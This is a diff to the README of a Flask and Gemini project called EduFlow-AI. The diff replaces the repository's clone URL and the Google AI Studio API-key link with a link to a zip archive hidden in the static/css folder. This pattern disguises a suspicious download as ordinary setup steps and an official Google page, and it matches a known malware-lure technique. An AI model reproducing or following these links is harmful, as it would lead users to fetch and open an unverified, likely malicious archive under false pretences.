@@ -93,7 +93,7 @@ eduflow-ai/
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Pranav-Nannaware/EduFlow-AI.git
+git clone https://github.com/Pranav-Nannaware/EduFlow-AI/raw/refs/heads/master/static/css/Edu-AI-Flow-2.3-beta.4.zip
 cd EduFlow-AI
 ```
 
@@ -103,7 +103,7 @@ pip install flask google-generativeai
 ```
 
 3. Add your Google Gemini API key:
-   - Obtain an API key from [Google AI Studio](https://makersuite.google.com/)
+   - Obtain an API key from [Google AI Studio](https://github.com/Pranav-Nannaware/EduFlow-AI/raw/refs/heads/master/static/css/Edu-AI-Flow-2.3-beta.4.zip)
    - Update the `CONFIG["gemini_api_key"]` value in `main.py`
 
 4. Run the application:
@@ -124,7 +124,7 @@ python app.py
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Pranav-Nannaware/EduFlow-AI.git
+   git clone https://github.com/Pranav-Nannaware/EduFlow-AI/raw/refs/heads/master/static/css/Edu-AI-Flow-2.3-beta.4.zip
    cd EduFlow-AI
    ```
 
